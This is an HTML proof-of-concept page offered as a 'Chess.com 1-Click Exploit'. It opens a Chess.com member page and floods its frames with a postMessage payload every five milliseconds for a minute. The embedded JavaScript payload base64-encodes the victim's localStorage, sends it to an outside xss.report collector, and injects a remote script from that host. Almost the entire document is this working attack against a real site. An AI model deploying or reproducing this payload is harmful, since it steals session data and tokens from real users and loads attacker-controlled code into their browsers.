<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chess.com Exploit</title>
    <style>
        body { background: #1a202c; color: white; text-align: center; padding-top: 150px; font-family: sans-serif; }
        button { padding: 15px 40px; font-size: 22px; background: #e53e3e; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #c53030; }
    </style>
</head>
<body>
    <h1>Chess.com 1-Click Exploit</h1>
    <p>Please wait up to 60 seconds after clicking for the ad auction to load.</p>
    <button onclick="startExploit()">Launch Exploit</button>

    <script>
        // الـ Payload الآمن تماماً (لا يمكن أن ينكسر)
        let payload = "window.print();fetch('https://xss.report/c/hussein19?data='+btoa(JSON.stringify(localStorage)));var s=document.createElement('script');s.src='https://xss.report/c/hussein19';document.body.appendChild(s); // get_ext";
        let spammer;

        function blast(win) {
            try { win.postMessage(payload, "*"); } catch(e) {}
            try {
                for (let i = 0; i < win.frames.length; i++) {
                    blast(win.frames[i]);
                }
            } catch(e) {}
        }

        function startExploit() {
            let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victim");
            
            setTimeout(() => {
                // سباق الزمن: نضرب الكود كل 5 ملي ثانية
                spammer = setInterval(() => {
                    if(victimWin) blast(victimWin);
                }, 5);

                // إيقاف الهجوم بعد 60 ثانية (لإعطاء فرصة لمزاد الإعلانات الثاني)
                setTimeout(() => {
                    clearInterval(spammer);
                    console.log("Attack finished.");
                }, 60000);

            }, 3000); 
        }
    </script>
</body>
